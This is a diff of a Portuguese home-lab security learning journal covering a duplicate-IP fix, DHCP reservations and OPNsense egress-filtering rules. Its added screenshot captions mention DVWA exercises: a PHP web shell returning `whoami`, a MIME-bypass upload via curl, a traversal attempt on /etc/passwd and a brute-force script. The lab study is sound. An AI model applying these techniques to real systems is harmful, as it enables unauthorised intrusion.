+A topologia original do projeto já continha uma nota de incerteza sobre o IP do Windows Server ("a confirmar, pode conflituar com gateway") — a preocupação estava certa em espírito (risco de conflito), mas o conflito real acabou por ser com o Kali, não com o gateway. Isto reforça a lição já registada na Entrada #78: nunca assumir que a topologia documentada corresponde ao estado real de uma VM sem verificar diretamente — configurações manuais feitas em fases anteriores podem divergir silenciosamente do que está escrito, e só se descobrem ao testar. Optar por reservas estáticas DHCP (em vez de IP fixo configurado manualmente em cada VM) para as máquinas que já usam DHCP é também mais robusto a longo prazo: o IP fica garantido sem depender de configuração manual dentro do sistema operativo de cada VM.
+
+### Consigo explicar isto a alguém?
+Sim — por palavras próprias: "descobrimos que o Windows Server e o Kali estavam com o mesmo IP configurado por engano, o que causa problemas de rede imprevisíveis porque duas máquinas não podem partilhar o mesmo endereço numa rede. Corrigi o IP do Windows Server por linha de comandos e, para as outras máquinas que usam DHCP, criei reservas fixas no servidor DHCP do OPNsense para que o IP delas nunca mude."
+
+### Como nos podemos defender
+Não aplicável no sentido ofensivo/defensivo direto — é gestão de infraestrutura de rede. Mas há uma ligação relevante: a deteção de duplicados de IP que vimos em ação (o estado "Tentative" → "Preferred" do Windows, baseado em ARP) é o mesmo mecanismo de rede que técnicas maliciosas como ARP spoofing exploram — a rede confia, por defeito, em quem responde a um pedido ARP para determinado IP, sem autenticação.
+
+### Domínios relacionados
+Fundamentos de redes (IP estático vs. DHCP, deteção de endereços duplicados via ARP, reservas DHCP) — relevante para Network+ e Security+.
+
+### Próximos passos
+Criar as regras de firewall (pass + block) no OPNsense para Windows Server, Windows 11 e Ubuntu Desktop, seguindo o padrão já validado no Servidor Vulnerável.
+
+## Entrada #80 — Egress filtering alargado a Windows Server, Windows 11 e Ubuntu Desktop
+**Data/hora:** 2026-08-25
+**Máquinas ligadas:** Windows Server, Windows 11, Ubuntu Desktop, OPNsense (via browser no Kali)
+
+### Objetivo / Propósito
+Alargar o egress filtering do OPNsense — já aplicado ao Servidor Vulnerável na Entrada #72 — às restantes VMs do lab que não precisam de acesso à internet: Windows Server, Windows 11 e Ubuntu Desktop. O Kali foi deliberadamente excluído, por ser a máquina atacante e precisar de internet para atualizar ferramentas.
+
+### Ação executada / dificuldades encontradas
+1. Para cada uma das três VMs, criado o mesmo par de regras em `Firewall → Rules → LAN`, replicando o padrão já validado no Servidor Vulnerável: uma regra **Pass** (Source = IP da VM, Destination = 192.168.10.0/24) seguida de uma regra **Block** (Source = IP da VM, Destination = any).
+2. **Dificuldade recorrente** — todas as regras novas são acrescentadas por defeito ao fim da lista, depois das regras "Default allow LAN to any rule" / "Default allow LAN IPv6 to any rule". Como o OPNsense avalia as regras de cima para baixo e aplica a primeira que corresponder ("first match"), foi necessário arrastar manualmente cada regra nova para cima dessas regras "Default allow" — caso contrário, o bloqueio nunca seria avaliado, porque a regra "Default allow" (mais genérica e mal posicionada primeiro) já teria deixado passar o tráfego antes de chegar à regra de bloqueio.
+3. Alterações aplicadas ("Apply changes") após cada par de regras.
+4. Teste de confirmação em cada VM, por linha de comandos: ping à rede do lab (gateway 192.168.10.254) e ping a um IP da internet (8.8.8.8).
+
+### Resultado
+As três VMs mantêm acesso total à rede interna do lab e ficam completamente bloqueadas para a internet:
+- **Windows Server**: 192.168.10.254 → 0% perda; 8.8.8.8 → 100% perda
+- **Windows 11**: 192.168.10.254 → 0% perda; 8.8.8.8 → 100% perda
+- **Ubuntu Desktop**: 192.168.10.254 → 0% perda; 8.8.8.8 → 100% perda
+
+Com isto, apenas o Kali mantém acesso à internet no segmento "Ciber" — todas as restantes VMs do lab estão agora isoladas da rede externa, só comunicando dentro do laboratório.
+
+### Deduções e raciocínio
+A ordem das regras de firewall (avaliação "first match", de cima para baixo) foi o ponto central desta sessão de trabalho: uma regra tecnicamente correta mas mal posicionada é, na prática, uma regra que nunca chega a ser avaliada. Isto generaliza a lição já registada na Entrada #72 e reforça-a com repetição — qualquer firewall baseado em listas ordenadas de regras (não é uma particularidade do OPNsense) tem este comportamento. Vale a pena manter o hábito de verificar sempre a posição final de uma regra na lista, não só o conteúdo dela.
+
+### Consigo explicar isto a alguém?
+Sim — por palavras próprias: "criámos duas regras de firewall para cada máquina: uma que permite tráfego dentro da rede do laboratório e outra que bloqueia tudo o resto, incluindo a internet. A ordem das regras é crítica — se a regra de bloqueio ficar posicionada depois de uma regra que já permite tudo, nunca chega a ser aplicada. Confirmei com testes de ping que cada máquina continua a comunicar dentro do lab mas não consegue sair para a internet."
+
+### Como nos podemos defender
+Isto é, em si, uma técnica defensiva: segmentação de rede aplicada segundo o princípio do menor privilégio — máquinas que não precisam de acesso à internet não o têm, o que reduz a superfície de ataque (por exemplo, exfiltração de dados ou comunicação com um servidor de comando e controlo) mesmo que uma dessas máquinas venha a ser comprometida.
+
+### Domínios relacionados
+Segurança de rede, firewalls, segmentação de rede, princípio do menor privilégio — relevante para Security+ e Network+.
+
+### Próximos passos
+A Fase 5 fica agora apenas com o bloco Wazuh (SIEM/HIDS) por concluir, reservado para uma sessão futura por pedido explícito. Sessão pausada aqui.
+
+---
+
 ## Screenshots
+### 2026-08-24
+
+- `screenshots/2026-08-24/entrada70-gpo-aviso-login-texto.png` — GPMC, texto do aviso de login definido (Entrada #70)
+- `screenshots/2026-08-24/entrada70-gpo-aviso-login-titulo.png` — GPMC, título do aviso de login definido (Entrada #70)
+- `screenshots/2026-08-24/entrada71-ipconfig-dns-incorreto-antes.png` — Windows 11, ipconfig /all com DNS incorreto antes da correção (Entrada #71)
+- `screenshots/2026-08-24/entrada71-dns-corrigido-resolve-dnsname.png` — DNS corrigido, Resolve-DnsName lab.local com sucesso (Entrada #71)
+- `screenshots/2026-08-24/entrada71-erro-addcomputer-shell-errada.png` — erro Add-Computer corrido na shell errada (Entrada #71)
+- `screenshots/2026-08-24/entrada71-dialogo-selecionar-aplicacao-bug.png` — diálogo estranho "Selecionar uma aplicação" durante o Get-Credential (Entrada #71)
+- `screenshots/2026-08-24/entrada71-aviso-login-confirmado-windows11.png` — aviso de login GPO confirmado visualmente no Windows 11 (Entrada #71)
+- `screenshots/2026-08-24/entrada72-firewall-regras-lan-antes.png` — OPNsense, regras LAN apenas com as regras default, antes do hardening (Entrada #72)
+- `screenshots/2026-08-24/entrada72-dhcp-leases-servidor-vulneravel.png` — OPNsense, DHCP leases com "show inactive", servidor-vulneravel em 192.168.10.101 (Entrada #72)
+- `screenshots/2026-08-24/entrada72-dhcp-mapeamento-estatico.png` — OPNsense, mapeamento estático DHCP do servidor-vulneravel (Entrada #72)
+- `screenshots/2026-08-24/entrada72-source-any-tag-trap.png` — a armadilha da tag "any" no campo Source do OPNsense (Entrada #72)
+- `screenshots/2026-08-24/entrada72-destination-any-bug-regra-bloqueio.png` — regra de bloqueio com Destination ainda em "any" (bug por corrigir) (Entrada #72)
+- `screenshots/2026-08-24/entrada72-diagnostics-states-sem-resultados.png` — Diagnostics: States, sem states antigos encontrados (Entrada #72)
+- `screenshots/2026-08-24/entrada72-ip-route-dual-nic-duas-rotas.png` — ip route mostrando as duas rotas default (descoberta do segundo NIC NAT) (Entrada #72)
+- `screenshots/2026-08-24/entrada72-regras-lan-antes-so-permitir.png` — regras LAN só com a regra de permitir tráfego, antes da regra de bloqueio (Entrada #72)
+- `screenshots/2026-08-24/entrada72-regras-lan-ips-corrigidos.png` — regras LAN com os IPs reais corrigidos após a remoção da tag "any" (Entrada #72)
+- `screenshots/2026-08-24/entrada72-regra-permitir-trafego-configurada.png` — regra "permitir tráfego" configurada corretamente (Source e Destination) (Entrada #72)
+- `screenshots/2026-08-24/entrada72-regras-lan-aplicadas-sucesso.png` — regras LAN aplicadas com sucesso, ambas as regras do Servidor Vulnerável presentes (Entrada #72)
+- `screenshots/2026-08-24/entrada72-ping-teste-final-sucesso.png` — teste final: ping ao lab a 0% perda, ping a 8.8.8.8 a 100% perda (confirmação do egress filtering) (Entrada #72)
+- `screenshots/2026-08-24/entrada74-lockout-credenciais-invalidas-atraso.png` — ecrã de login, "Credenciais inválidas, a atrasar a próxima tentativa..." (Entrada #74)
+- `screenshots/2026-08-24/entrada74-lockout-nome-utilizador-errado.png` — ecrã de login, "O nome de utilizador ou palavra-passe estão errados" (Entrada #74)
+- `screenshots/2026-08-24/entrada74-gpmc-account-lockout-policy-final.png` — GPMC, Account Lockout Policy com os valores finais (30 min / 5 tentativas / 30 min) (Entrada #74)
+
+
+- `2026-08-22/entrada57-vm-erro-power-on-lck.png` — erro de arranque da VM "Servidor Vulnerável" causado por ficheiros de bloqueio (.lck) órfãos
+
+- `2026-08-22/entrada55-opnsense-lan-antes-192-168-10-1.png` — consola do OPNsense com LAN em 192.168.10.1/24 (antes da correção)
+- `2026-08-22/entrada55-opnsense-lan-depois-192-168-10-254.png` — consola do OPNsense com LAN corrigido para 192.168.10.254/24
+- `2026-08-22/entrada55-opnsense-dhcp-conflito-ip-10.png` — página de Leases do OPNsense mostrando a reserva estática conflituosa em 192.168.10.10
+- `2026-08-22/entrada53-wireguard-windows-privatekey-automatica.png` — chave privada gerada automaticamente pela app WireGuard no Windows 11
+- `2026-08-22/entrada53-wireguard-cliente-peer-detalhes.png` — painel de detalhes do túnel cliente com o Peer configurado
+- `2026-08-22/entrada53-wireguard-cliente-peer-editor-config.png` — editor de configuração com a secção [Peer] escrita à mão
+- `2026-08-22/entrada53-wireguard-handshake-falhado-0-recebido.png` — túnel ativo mas sem handshake (0 B recebido)
+- `2026-08-22/entrada54-wireguard-download-timeout-firewall.png` — erro de timeout ao descarregar o ficheiro de configuração (porta 8000 bloqueada)
+- `2026-08-22/entrada54-wireguard-ping-sucesso-final.png` — ping bem-sucedido através do túnel WireGuard, confirmando a ligação
 
 Os prints ilustrativos de cada dia de trabalho ficam guardados em `screenshots/AAAA-MM-DD/`, referenciados a partir da entrada correspondente.
 
@@ -2463,4 +4179,8 @@ Os prints ilustrativos de cada dia de trabalho ficam guardados em `screenshots/A
 - `screenshots/2026-08-16/entrada37-fileupload-low-rce-www-data.png` — File Upload Low: `?cmd=whoami` devolve `www-data` (RCE confirmado)
 - `screenshots/2026-08-16/entrada38-fileupload-medium-bloqueado.png` — File Upload Medium: upload do `.php` bloqueado ("We can only accept JPEG or PNG images")
 - `screenshots/2026-08-16/entrada38-fileupload-medium-rce-www-data.png` — File Upload Medium: RCE após bypass do MIME type via `curl` (`www-data`)
+- `screenshots/2026-08-17/entrada41-fileinclusion-low-payload-etcpasswd-pagina-em-branco.png` — File Inclusion Low: primeiro teste (traversal relativo), página carregada mas corpo vazio — falha do payload, não defesa
+- `screenshots/2026-08-17/entrada41-fileinclusion-phpinfo-allow-url-include-off.png` — File Inclusion: página PHP Info confirmando `allow_url_include` em `Off` (Local e Master) — RFI bloqueado ao nível do PHP
+- `screenshots/2026-08-17/entrada47-bruteforce-low-pagina-login.png` — Brute Force Low: página do módulo, teste de controlo com login bem-sucedido (`admin`/`password`)
+- `screenshots/2026-08-17/entrada50-bruteforce-high-script-token-sucesso.png` — Brute Force High: terminal com o script de dois passos (token anti-CSRF), a percorrer a wordlist e a encontrar `password` na 5ª tentativa
 - `screenshots/2026-08-16/entrada39-fileupload-high-bloqueado.png` — File Upload High: `shell2.php` (ficheiro novo) rejeitado — o bypass do Medium já não funciona
